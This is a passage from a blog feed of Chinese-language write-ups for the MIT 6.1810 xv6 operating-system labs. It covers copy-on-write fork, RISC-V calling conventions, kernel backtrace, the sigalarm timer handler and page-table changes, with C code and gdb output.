present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_W) &#123;</span><br><span class="line">      flags = (flags &amp; ~PTE_W) | PTE_COW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mappages(new, i, PGSIZE, pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_COW) &#123;</span><br><span class="line">      *pte = PA2PTE(pa) | flags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    krefIncre((<span class="type">void</span>*)pa);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>怎么有人总是把 &amp; 和 | 的功能写反</del></p><ol start="4"><li>修改 kernel/trap.c 的 <code>usertrap</code> 和 kernel/vm.c 的 <code>copyout</code>，添加遇到 COW 页的情况</li></ol><p>注意虚拟地址要小于 MAXVA，否则在 <code>walk</code> 时会直接出现 panic</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="type">pte_t</span> *pte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    <span class="keyword">if</span>(dstva &lt; MAXVA) &#123;</span><br><span class="line">      pte = walk(pagetable, dstva, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pte &amp;&amp; (*pte &amp; PTE_COW)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(copyCOW(pte)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="type">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyCOW</span><span class="params">(<span class="type">pte_t</span> *pte)</span> &#123;</span><br><span class="line">  uint64 pa = PTE2PA(*pte);</span><br><span class="line">  uint flags = (PTE_FLAGS(*pte) &amp; ~PTE_COW) | PTE_W;</span><br><span class="line">  *pte = PA2PTE(pa) | flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(kref((<span class="type">void</span>*)pa) != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> *mem = kalloc();</span><br><span class="line">    <span class="keyword">if</span>(mem == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      memmove(mem, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(mem) | flags;</span><br><span class="line">      krefDecre((<span class="type">void</span>*)pa);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(r_scause() == <span class="number">15</span> &amp;&amp; r_stval() &lt; MAXVA &amp;&amp; (*(pte = walk(p-&gt;pagetable, r_stval(), <span class="number">0</span>)) &amp; PTE_COW)) &#123;</span><br><span class="line">  <span class="comment">// store COW page fault</span></span><br><span class="line">  <span class="keyword">if</span>(copyCOW(pte)) &#123;</span><br><span class="line">    setkilled(p);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后在 kernel/defs.h 里添加一些函数声明即可</p><h2 id="Optional-challenge-exercise"><a href="#Optional-challenge-exercise" class="headerlink" title="Optional challenge exercise"></a>Optional challenge exercise</h2><h3 id="测量你的-COW-实现减少了多少字节的复制和多少页物理内存的分配"><a href="#测量你的-COW-实现减少了多少字节的复制和多少页物理内存的分配" class="headerlink" title="测量你的 COW 实现减少了多少字节的复制和多少页物理内存的分配"></a>测量你的 COW 实现减少了多少字节的复制和多少页物理内存的分配</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;页表牛逼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab4 Traps</title>
    <link href="https://humoooor.cn/2022/10/31/Lab4_Traps/"/>
    <id>https://humoooor.cn/2022/10/31/Lab4_Traps/</id>
    <published>2022-10-31T03:47:00.000Z</published>
    <updated>2024-01-04T04:30:06.730Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h2><figure class="highlight c"><figcaption><span>user/call.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x+<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读 user/call.asm 回答问题~</p><figure class="highlight x86asm"><figcaption><span>main.asm</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">  1c: <span class="number">1141</span>                 addi  <span class="built_in">sp</span>,<span class="built_in">sp</span>,-<span class="number">16</span></span><br><span class="line">  1e: e406                 sd ra,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">20</span>: e022                 sd s0,<span class="number">0</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">22</span>: <span class="number">0800</span>                 addi  s0,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">  printf(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>)<span class="comment">;</span></span><br><span class="line">  <span class="number">24</span>: <span class="number">4635</span>                 li a2,<span class="number">13</span></span><br><span class="line">  <span class="number">26</span>: 45b1                 li a1,<span class="number">12</span></span><br><span class="line">  <span class="number">28</span>: <span class="number">00000517</span>             auipc a0,<span class="number">0x0</span></span><br><span class="line">  2c: 7c850513             addi  a0,a0,<span class="number">1992</span> # 7f0 &lt;malloc+<span class="number">0xee</span>&gt;</span><br><span class="line">  <span class="number">30</span>: <span class="number">00000097</span>             auipc ra,<span class="number">0x0</span></span><br><span class="line">  <span class="number">34</span>: 614080e7             jalr  <span class="number">1556</span>(ra) # <span class="number">644</span> &lt;printf&gt;</span><br><span class="line">  exit(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">  <span class="number">38</span>: <span class="number">4501</span>                 li a0,<span class="number">0</span></span><br><span class="line">  3a: <span class="number">00000097</span>             auipc ra,<span class="number">0x0</span></span><br><span class="line">  3e: 290080e7             jalr  <span class="number">656</span>(ra) # 2ca &lt;exit&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>传给函数的参数保存在哪些寄存器中？例如 main 函数中的调用 printf 的参数 13 保存在哪个寄存器中？</p></blockquote><p>a0 ~ a7 保存函数参数，更多的参数放在栈中</p><p>main 调用 printf 的参数 13 在 a2 中</p><blockquote><p>main 函数中调用 f 函数的汇编代码在哪？调用 g 函数的代码在哪？（提示：编译器可能内联函数）</p></blockquote><p>真的有调用吗。。。感觉编译器优化了，直接把 f(8)+1 的结果计算出来为 12，传给 a1 寄存器了。</p><blockquote><p>printf 函数的地址是多少？</p></blockquote><p>看注释，在 0x644</p><blockquote><p>在 main 函数中，在执行 jalr 跳转到 printf 后，ra 寄存器的值时多少？</p></blockquote><p>0x38</p><p>jalr 会将下一条指令的地址存到括号中的寄存器中</p><blockquote><p>运行下面的代码，输出什么？<br>unsigned int i = 0x00646c72;<br>printf(“H%x” Wo%s”, 57616, &amp;i);</p></blockquote><p>He110 World</p><blockquote><p>下面的代码，会打印出 ‘y=’ 什么？<br>printf(“x=%d y=%d”, 3);</p></blockquote><p>按照 RISC-V 的函数调用约定，会打印出 a2 寄存器的值</p><h2 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h2><p>对内核的函数调用进行回溯，比较简单</p><p>根据 RISC-V 的函数调用约定，ra 位于 fp - 0x8 的位置，Prev.fp 位于 fp - 0x10 的位置</p><p>在内核栈中，最后一个栈帧指针位于页面的首地址，根据这个可以判断何时退出循环</p><p>可以通过 gdb 进行调试，0x3ffffff9fc0 -&gt; 0x3ffffffe0 -&gt; 0x3ffffffa000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20gx <span class="variable">$fp</span>-0x10</span><br><span class="line">0x3fffff9f70:   0x0000003fffff9fc0      0x00000000800021aa</span><br><span class="line">0x3fffff9f80:   0x0000003fffff9fc0      0x00000001ffff9fa0</span><br><span class="line">0x3fffff9f90:   0x0000003fffff9fc0      0x0000000000000020</span><br><span class="line">0x3fffff9fa0:   0x0000000087f70000      0x0000000080009030</span><br><span class="line">0x3fffff9fb0:   0x0000003fffff9fe0      0x000000008000201c</span><br><span class="line">0x3fffff9fc0:   0x0000000000000063      0x0000000080009030</span><br><span class="line">0x3fffff9fd0:   0x0000003fffffa000      0x0000000080001d12</span><br><span class="line">0x3fffff9fe0:   0x0000000000000063      0x0000000000014f50</span><br><span class="line">0x3fffff9ff0:   0x0000000000003fd0      0x0000000000000012</span><br><span class="line">0x3fffffa000:   Cannot access memory at address 0x3fffffa000</span><br></pre></td></tr></table></figure><p>但是在用户栈中，最后一个栈帧指针是页面的首地址 - 0x10，就很怪。。。</p><p>比如在 sh 打印 <code>$ </code> 时，查看用户栈，0x4fd0 -&gt; 0x4fe0 -&gt; 0x4ff0，最后一个指针是 0x4ff0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20gx <span class="variable">$fp</span>-0x10</span><br><span class="line">0x4f80: 0x0000000000004fd0      0x0000000000000ade</span><br><span class="line">0x4f90: 0x0000000000000000      0x0505050505050505</span><br><span class="line">0x4fa0: 0x0505050505050505      0x0505050505050505</span><br><span class="line">0x4fb0: 0x00000000000008a8      0x0000000000000000</span><br><span class="line">0x4fc0: 0x0000000000004fe0      0x0000000000000b66</span><br><span class="line">0x4fd0: 0x0000000000003fd0      0x00000000000000de</span><br><span class="line">0x4fe0: 0x0000000000004ff0      0x0000000000000000</span><br><span class="line">0x4ff0: 0x0000000000006873      0x0000000000000000</span><br><span class="line">0x5000: Cannot access memory at address 0x5000</span><br></pre></td></tr></table></figure><p><del>算了，不管这么多了，反正也只用回溯内核栈</del></p><p>把 <code>backtrace</code> 贴到 kernel/printf.c 中，在 kernel/defs.h 中添加声明，然后在 <code>sys_sleep</code> 调用就好了</p><figure class="highlight c"><figcaption><span>kernel/printf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">backtrace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;backtrace:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(uint64 fp = r_fp(); fp != PGROUNDUP(fp); fp = *(uint64*)(fp<span class="number">-0x10</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(uint64*)(fp<span class="number">-0x8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得的地址可以通过 addr2line 得到对应的程序代码的位置，便于调试</p><p>如 <code>addr2line -e kernel/kernel</code></p><p>放到 <code>panic</code> 函数中，可以更好地方便内核崩溃原因</p><h2 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h2><p>添加一个用户级的定时器中断，也就是 <code>sigalarm(interval, handler)</code> 和 <code>sigreturn()</code></p><p>每 n 次硬件计时器中断，就会调用一次 handler，在 handler 中要有 <code>sigreturn</code> 保证还原到原本的状态</p><p>笔者天真地以为保存 p-&gt;trapframe-&gt;epc 就行了，wsfw（还有通用寄存器要进行保存）</p><h3 id="在-proc-结构体添加变量"><a href="#在-proc-结构体添加变量" class="headerlink" title="在 proc 结构体添加变量"></a>在 proc 结构体添加变量</h3><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  <span class="type">int</span> alarm_interval;</span><br><span class="line">  uint64 alarm_handler;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">alarm_state</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ticks<ul><li>保存计时器中断次数，每中断一次，ticks++</li></ul></li><li>alarm_state<ul><li>直接用 <code>struct trapframe</code> 结构体保存原状态（笔者是个懒人</li><li>在每次调用 handler 前，将其指向 p-&gt;trapframe + 1，<code>sigreturn</code> 后置零</li></ul></li></ul><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc*</span><br><span class="line"><span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  p-&gt;ticks = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_interval = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_handler = <span class="number">0</span>;</span><br><span class="line">  p-&gt;alarm_state = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加系统调用"><a href="#添加系统调用" class="headerlink" title="添加系统调用"></a>添加系统调用</h3><figure class="highlight c"><figcaption><span>kernel/sysproc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  uint64 handler;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;ticks);</span><br><span class="line">  argaddr(<span class="number">1</span>, &amp;handler);</span><br><span class="line"></span><br><span class="line">  p-&gt;alarm_interval = ticks;</span><br><span class="line">  p-&gt;alarm_handler = handler;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  uint64 a0 = p-&gt;alarm_state-&gt;a0;</span><br><span class="line"></span><br><span class="line">  memmove(p-&gt;trapframe, p-&gt;alarm_state, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">  <span class="built_in">memset</span>(p-&gt;alarm_state, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">  p-&gt;alarm_state = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> a0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计时器中断时判断是否执行-handler"><a href="#计时器中断时判断是否执行-handler" class="headerlink" title="计时器中断时判断是否执行 handler"></a>计时器中断时判断是否执行 handler</h3><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>) &#123;</span><br><span class="line">    yield();</span><br><span class="line">    p-&gt;ticks++;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;alarm_interval &amp;&amp; !p-&gt;alarm_state &amp;&amp; p-&gt;ticks % p-&gt;alarm_interval == <span class="number">0</span>) &#123;</span><br><span class="line">      p-&gt;alarm_state = p-&gt;trapframe + <span class="number">1</span>;</span><br><span class="line">      memmove(p-&gt;alarm_state, p-&gt;trapframe, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">      p-&gt;trapframe-&gt;epc = p-&gt;alarm_handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后添加一些声明即可</p><h2 id="Option-challenge-exercises"><a href="#Option-challenge-exercises" class="headerlink" title="Option challenge exercises"></a>Option challenge exercises</h2><h3 id="backtrace-打印函数名和行号"><a href="#backtrace-打印函数名和行号" class="headerlink" title="backtrace 打印函数名和行号"></a>backtrace 打印函数名和行号</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab3 Page Tables</title>
    <link href="https://humoooor.cn/2022/10/23/Lab3_Page_tables/"/>
    <id>https://humoooor.cn/2022/10/23/Lab3_Page_tables/</id>
    <published>2022-10-23T08:56:00.000Z</published>
    <updated>2024-01-04T04:30:04.086Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git checkout pgtbl</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><h2 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h2><p>为了优化 <code>getpid</code> 系统调用，不用每次进入内核态获取 PID，创建一个用户可读的页，将 USYSCALL 映射到该页上</p><p>可以观察 <code>ugetpid</code> 函数的定义，它直接访问 USYSCALL 即可拿到 pid，不需要系统调用，算是以空间换时间</p><figure class="highlight c"><figcaption><span>user/ulib.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ugetpid</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">u</span> =</span> (<span class="keyword">struct</span> usyscall *)USYSCALL;</span><br><span class="line">  <span class="keyword">return</span> u-&gt;pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在 <code>kernel/proc.h</code> 中 proc 结构体加入 <code>struct usyscall *usyscall</code></li><li>在 <code>allocproc</code> 初始化 usyscall</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc* <span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;usyscall = (<span class="keyword">struct</span> usyscall *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;usyscall-&gt;pid = p-&gt;pid;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>在 <code>proc_pagetable</code> 建立映射</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pagetable_t</span> <span class="title function_">proc_pagetable</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(mappages(pagetable, USYSCALL, PGSIZE,</span><br><span class="line">            (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    uvmfree(pagetable, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>在 <code>freeproc</code> 释放 usyscall</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span 